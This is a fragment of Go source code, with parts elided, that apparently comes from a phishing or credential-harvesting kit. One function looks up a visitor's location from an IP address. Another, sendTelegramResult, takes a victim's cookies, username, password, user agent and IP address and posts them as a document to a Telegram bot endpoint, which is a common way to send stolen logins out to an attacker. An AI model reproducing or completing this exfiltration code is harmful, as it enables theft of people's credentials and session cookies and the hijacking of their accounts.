...
func getUserLocation(ip string) (string, error) {
	// Call IP geolocation API to get the user's location
	...
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("failed to decode location response: %v", err)
	}

	// Extract necessary fields from the response
	if result["status"] == "success" {
		country := result["country"].(string)
		region := result["regionName"].(string)
		city := result["city"].(string)
		location := fmt.Sprintf("%s, %s, %s", city, region, country)
		return location, nil
	}
	return "", fmt.Errorf("failed to get valid location data")
}
...
func sendTelegramResult(cookies string, username string, password string, useragent string, remote_addr string) {
	...
	// Correctly format the URL for sending documents
	url := fmt.Sprintf("%s/sendDocument", getUrl())
